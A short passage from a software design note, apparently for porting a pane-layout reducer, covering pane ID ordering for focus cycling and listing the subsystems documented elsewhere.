9. **IDs and ordering.** `panes` order is append order and is user-visible only through
   layout traversal; `allPaneIDs(layout)` (DFS, first-then-second) is the canonical
   order for focus cycling and predefined-layout rebuilds. Preserve both orderings in
   the port's data structures.

10. **What is NOT here.** Workspace creation/deletion/reordering, groups, the socket
    protocol's request/response framing, label presets, notifications/dock badges, and
    the git worktree flows live in the app-reducer / socket subsystem docs. This
    reducer only ever sees already-resolved pane/workspace UUIDs; all name-or-id and
    label resolution happens upstream.
